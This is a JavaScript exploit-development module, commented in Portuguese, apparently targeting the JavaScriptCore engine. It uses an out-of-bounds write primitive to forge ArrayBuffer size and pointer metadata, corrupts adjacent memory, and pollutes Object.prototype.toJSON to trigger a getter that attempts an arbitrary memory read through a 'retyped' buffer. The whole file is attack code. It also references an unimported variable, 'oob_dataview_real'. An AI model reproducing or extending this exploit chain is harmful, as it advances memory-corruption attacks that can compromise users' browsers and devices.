// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real, // A variável global que referencia o ArrayBuffer principal
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterForRetypeCheck";
let retype_getter_called_flag = false;
let retype_leak_attempt_results = {};

// Endereço baixo e inválido para o teste de crash controlado.
// Usar 0x0 pode às vezes ser mapeado (página nula), 0x1 é geralmente uma boa aposta para causar um page fault.
const ENDERECO_INVALIDO_PARA_LEITURA_TESTE = new AdvancedInt64(0x1, 0x0);


class CheckpointObjectForRetype {
    constructor(id) {
        this.id = `RetypeCheckpoint-${id}`;
        this.marker = 0xD0D0D0D0; // Marcador interno para identificação
    }
}

export function toJSON_TriggerRetypeCheckpointGetter() {
    const FNAME_toJSON = "toJSON_TriggerRetypeCheckpointGetter";
    let returned_payload = { _variant_: FNAME_toJSON, _id_at_entry_: String(this?.id || "N/A") };
    try {
        for (const prop in this) {
            if (prop === GETTER_CHECKPOINT_PROPERTY_NAME) {
                 logS3(`Propriedade getter "${prop}" encontrada durante 'for...in' em toJSON.`, "info", FNAME_toJSON);
                 const _ = this[prop];
            }
        }
    } catch (e) {
        logS3(`Erro dentro do toJSON_TriggerRetypeCheckpointGetter durante o loop de propriedades: ${e.message}`, "error", FNAME_toJSON);
        returned_payload.error_in_loop = e.message;
    }
    return returned_payload;
}


export async function executeRetypeOOB_AB_Test() {
    const FNAME_TEST = "executeRetypeOOB_AB_Test";
    logS3(`--- Iniciando Teste de "Re-Tipagem" do oob_array_buffer_real via ShadowCraft ---`, "test", FNAME_TEST);

    retype_getter_called_flag = false;
    retype_leak_attempt_results = { success: false, message: "Não inicializado", error: null };

    // Validações de configuração (essenciais)
    // Verifique se JSC_OFFSETS.ArrayBuffer e JSC_OFFSETS.ArrayBuffer.KnownStructureIDs existem antes de acessar ArrayBuffer_STRUCTURE_ID
    if (!JSC_OFFSETS.ArrayBufferContents ||
        JSC_OFFSETS.ArrayBufferContents.DATA_POINTER_OFFSET_FROM_CONTENTS_START === undefined ||
        JSC_OFFSETS.ArrayBufferContents.SIZE_IN_BYTES_OFFSET_FROM_CONTENTS_START === undefined ||
        JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET === undefined ||
        !JSC_OFFSETS.ArrayBuffer || // <-- ADICIONADO PARA VERIFICAÇÃO
        !JSC_OFFSETS.ArrayBuffer.KnownStructureIDs || // <-- ADICIONADO PARA VERIFICAÇÃO
        JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID === undefined) { // Linha ~70 onde o erro ocorreu
        logS3("Offsets críticos (ArrayBufferContents, JSCell.STRUCTURE_POINTER_OFFSET, ou ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID) não estão definidos corretamente em config.mjs. Abortando teste.", "critical", FNAME_TEST);
        console.error("Detalhes dos Offsets Ausentes/Incorretos:", {
            hasArrayBufferContents: !!JSC_OFFSETS.ArrayBufferContents,
            hasDataPointerOffset: JSC_OFFSETS.ArrayBufferContents?.DATA_POINTER_OFFSET_FROM_CONTENTS_START !== undefined,
            hasSizeInBytesOffset: JSC_OFFSETS.ArrayBufferContents?.SIZE_IN_BYTES_OFFSET_FROM_CONTENTS_START !== undefined,
            hasStructurePointerOffset: JSC_OFFSETS.JSCell?.STRUCTURE_POINTER_OFFSET !== undefined,
            hasArrayBuffer: !!JSC_OFFSETS.ArrayBuffer,
            hasKnownStructureIDs: !!JSC_OFFSETS.ArrayBuffer?.KnownStructureIDs,
            hasArrayBufferStructureID: JSC_OFFSETS.ArrayBuffer?.KnownStructureIDs?.ArrayBuffer_STRUCTURE_ID !== undefined
        });
        return;
    }
    const arrayBufferStructureID = JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID;
    // A verificação de arrayBufferStructureID !== 2 pode ser mantida ou ajustada conforme sua validação
    if (arrayBufferStructureID !== 2 && arrayBufferStructureID !== 0x2) {
         logS3(`AVISO: ArrayBuffer_STRUCTURE_ID (${arrayBufferStructureID}) não é o valor comum (2). Verifique config.mjs.`, "warn", FNAME_TEST);
    }


    let toJSONPollutionApplied = false;
    let getterPollutionApplied = false;
    let originalToJSONProtoDesc = null;
    let originalGetterDesc = null;
    const ppKey_val = 'toJSON';

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real || !oob_dataview_real) {
            logS3("Falha ao inicializar o ambiente OOB. Abortando.", "critical", FNAME_TEST);
            return;
        }
        logS3(`Ambiente OOB inicializado. oob_array_buffer_real.byteLength: ${oob_array_buffer_real.byteLength}`, "info", FNAME_TEST);

        const shadow_metadata_offset_in_oob_data = 0x0;
        const arbitrary_read_size = new AdvancedInt64(0x1000, 0x0);

        logS3(`Escrevendo metadados sombra no offset de dados ${toHex(shadow_metadata_offset_in_oob_data)} do oob_array_buffer_real...`, "info", FNAME_TEST);

        oob_write_absolute(
            shadow_metadata_offset_in_oob_data + JSC_OFFSETS.ArrayBufferContents.SIZE_IN_BYTES_OFFSET_FROM_CONTENTS_START,
            arbitrary_read_size,
            8
        );

        oob_write_absolute(
            shadow_metadata_offset_in_oob_data + JSC_OFFSETS.ArrayBufferContents.DATA_POINTER_OFFSET_FROM_CONTENTS_START,
            ENDERECO_INVALIDO_PARA_LEITURA_TESTE,
            8
        );
        logS3(`Metadados sombra configurados para apontar para: ${ENDERECO_INVALIDO_PARA_LEITURA_TESTE.toString(true)} com tamanho ${arbitrary_read_size.toString(true)}`, "info", FNAME_TEST);

        const corruption_trigger_offset_abs = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16;
        const corruption_value = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);
        logS3(`Realizando escrita OOB gatilho em offset absoluto ${toHex(corruption_trigger_offset_abs)} com valor ${corruption_value.toString(true)}`, "info", FNAME_TEST);
        oob_write_absolute(corruption_trigger_offset_abs, corruption_value, 8);

        const checkpoint_obj = new CheckpointObjectForRetype(1);
        originalGetterDesc = Object.getOwnPropertyDescriptor(CheckpointObjectForRetype.prototype, GETTER_CHECKPOINT_PROPERTY_NAME);

        Object.defineProperty(CheckpointObjectForRetype.prototype, GETTER_CHECKPOINT_PROPERTY_NAME, {
            get: function() {
                retype_getter_called_flag = true;
                const FNAME_GETTER = "RetypeGetter";
                logS3(`Getter "${GETTER_CHECKPOINT_PROPERTY_NAME}" foi CHAMADO em this.id = ${this?.id || 'N/A'}!`, "vuln", FNAME_GETTER);

                try {
                    logS3("Dentro do getter: Tentando criar DataView sobre oob_array_buffer_real (esperançosamente re-tipado)...", "info", FNAME_GETTER);
                    const retyped_dv = new DataView(oob_array_buffer_real);
                    logS3(`DataView (retyped_dv) criada. ByteLength: ${retyped_dv.byteLength}. Esperado: ${arbitrary_read_size.low()}`, "good", FNAME_GETTER);

                    logS3(`Tentando ler 4 bytes do endereço re-tipado (offset 0 da retyped_dv, que deve ser ${ENDERECO_INVALIDO_PARA_LEITURA_TESTE.toString(true)})...`, "info", FNAME_GETTER);
                    const valorLido = retyped_dv.getUint32(0, true);

                    logS3(`LEITURA INESPERADA BEM-SUCEDIDA do endereço ${ENDERECO_INVALIDO_PARA_LEITURA_TESTE.toString(true)}! Valor lido: ${toHex(valorLido)}`, "error", FNAME_GETTER);
                    retype_leak_attempt_results.success = false;
                    retype_leak_attempt_results.message = `Leitura de ${ENDERECO_INVALIDO_PARA_LEITURA_TESTE.toString(true)} retornou ${toHex(valorLido)} em vez de causar um erro/crash explícito.`;

                } catch (e) {
                    logS3(`SUCESSO ESPERADO (ERRO/CRASH): Erro ao tentar criar/usar DataView ou ler do endereço inválido ${ENDERECO_INVALIDO_PARA_LEITURA_TESTE.toString(true)}: ${e.message}`, "vuln", FNAME_GETTER);
                    retype_leak_attempt_results.success = true;
                    retype_leak_attempt_results.message = `A re-tipagem parece ter direcionado a leitura para ${ENDERECO_INVALIDO_PARA_LEITURA_TESTE.toString(true)}, causando erro: ${e.message}.`;
                    retype_leak_attempt_results.error = String(e);
                }
                return 0xBADF00D;
            },
            configurable: true
        });
        getterPollutionApplied = true;

        originalToJSONProtoDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
        Object.defineProperty(Object.prototype, ppKey_val, {
            value: toJSON_TriggerRetypeCheckpointGetter,
            writable: true,
            enumerable: false,
            configurable: true
        });
        toJSONPollutionApplied = true;
        logS3(`Poluição de Object.prototype.${ppKey_val} e getter em CheckpointObjectForRetype aplicadas.`, "info", FNAME_TEST);

        logS3(`Chamando JSON.stringify no checkpoint_obj (id: ${checkpoint_obj.id})...`, "info", FNAME_TEST);
        try {
            const jsonResult = JSON.stringify(checkpoint_obj);
            logS3(`JSON.stringify completado. Resultado: ${jsonResult}`, "info", FNAME_TEST);
        } catch (e) {
            logS3(`Erro durante JSON.stringify(checkpoint_obj): ${e.message}`, "error", FNAME_TEST);
            if (!retype_getter_called_flag) {
                 retype_leak_attempt_results.message = `Erro em JSON.stringify ANTES do getter ser chamado: ${e.message}`;
            }
        }

    } catch (mainError) {
        logS3(`Erro principal no teste executeRetypeOOB_AB_Test: ${mainError.message}`, "critical", FNAME_TEST);
        console.error(mainError);
        retype_leak_attempt_results.success = false;
        retype_leak_attempt_results.message = "Erro crítico no fluxo principal do teste.";
        retype_leak_attempt_results.error = String(mainError);
    } finally {
        if (toJSONPollutionApplied) {
            if (originalToJSONProtoDesc) Object.defineProperty(Object.prototype, ppKey_val, originalToJSONProtoDesc);
            else delete Object.prototype[ppKey_val];
        }
        if (getterPollutionApplied && CheckpointObjectForRetype.prototype.hasOwnProperty(GETTER_CHECKPOINT_PROPERTY_NAME)) {
            if (originalGetterDesc) {
                Object.defineProperty(CheckpointObjectForRetype.prototype, GETTER_CHECKPOINT_PROPERTY_NAME, originalGetterDesc);
            } else {
                delete CheckpointObjectForRetype.prototype[GETTER_CHECKPOINT_PROPERTY_NAME];
            }
        }
         logS3("Limpeza de poluição finalizada.", "info", "CleanupFinal");
    }

    if (retype_getter_called_flag) {
        if (retype_leak_attempt_results.success) {
            logS3(`RESULTADO DO TESTE DE CRASH CONTROLADO: ${retype_leak_attempt_results.message}`, "vuln", FNAME_TEST);
        } else {
            logS3(`RESULTADO DO TESTE DE CRASH CONTROLADO: Getter foi chamado, mas o resultado não foi o erro esperado ao ler de ${ENDERECO_INVALIDO_PARA_LEITURA_TESTE.toString(true)}. Detalhes: ${retype_leak_attempt_results.message}`, "warn", FNAME_TEST);
        }
    } else {
        logS3("RESULTADO DO TESTE: Getter NÃO foi chamado. A tentativa de re-tipagem não pôde ser verificada.", "error", FNAME_TEST);
    }
    logS3(`  Detalhes completos da tentativa: ${JSON.stringify(retype_leak_attempt_results)}`, "info", FNAME_TEST);

    clearOOBEnvironment();
    logS3(`--- Teste de "Re-Tipagem" (ShadowCraft) Concluído ---`, "test", FNAME_TEST);
}
